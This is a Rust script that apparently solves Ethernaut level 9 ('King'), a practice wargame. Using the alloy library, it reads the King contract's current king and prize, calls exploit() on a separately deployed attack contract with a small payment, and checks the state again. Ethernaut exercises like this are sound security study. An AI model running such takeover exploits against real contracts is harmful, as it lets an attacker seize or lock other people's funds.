#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract King{
        function prize() external view returns (uint256);
        function owner() external view returns (address);
        function _king() public view returns (address);
    }

    #[sol(rpc)]
    contract Exp{
        function exploit() payable public;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level09_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level09())?;

    Ok(())
}

async fn level09() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let king_address = "0x1E595A67205399dD63FFd4AA5b2AE252975FA78B".parse()?;
    let king = King::new(king_address, provider.clone());
    let exp_address = "0x0FB8f64706FAF1Db206950E214869AFB14d51471".parse()?;
    let exp = Exp::new(exp_address, provider.clone());
    println!("[CHECK]");
    let king_now = king._king().call().await?;
    let prize = king.prize().call().await?;
    println!("[King._king()]    king = {king_now}");
    println!("[King.prize()]    prize = {prize}");
    
    let exploit_tx = exp
        .exploit()
        .value(U256::from(1000000000000000u128))
        .send()
        .await?;
    println!(
        "[Exp.exploit()]    Panding transaction... {}", 
        exploit_tx.tx_hash()
    );
    
    let exploit_receipt = exploit_tx.get_receipt().await?;
    println!(
        "[Exp.exploit()]    transaction included in block {}\n",
        exploit_receipt
            .block_number
            .expect("Failed to get block number")
    );


    println!("[CHECK]");
    let king_now = king._king().call().await?;
    let prize = king.prize().call().await?;
    println!("[King._king()]    king = {king_now}");
    println!("[King.prize()]    prize = {prize}");
    
    Ok(())
}
